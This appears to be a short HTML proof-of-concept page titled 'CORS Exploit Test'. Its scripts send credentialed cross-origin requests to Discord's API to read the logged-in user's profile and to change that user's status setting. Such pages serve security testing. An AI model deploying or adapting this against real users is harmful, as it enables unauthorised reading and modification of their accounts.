<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit Test</title>
</head>
<body>
  <h1>CORS Exploit Test</h1>
  <button onclick="sendRead()">Test Read</button>
  <button onclick="sendWrite()">Test Write</button>

  <script>
    function sendRead() {
      fetch("https://discord.com/api/v9/users/@me", {
        method: "GET",
        credentials: "include"
      })
      .then(response => response.json())
      .then(data => alert("Read success: " + JSON.stringify(data)))
      .catch(err => alert("Read failed: " + err));
    }

    function sendWrite() {
      fetch("https://discord.com/api/v9/users/@me/settings", {
        method: "PATCH",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ status: "idle" })
      })
      .then(response => response.json())
      .then(data => alert("Write success: " + JSON.stringify(data)))
      .catch(err => alert("Write failed: " + err));
    }
  </script>
</body>
</html>
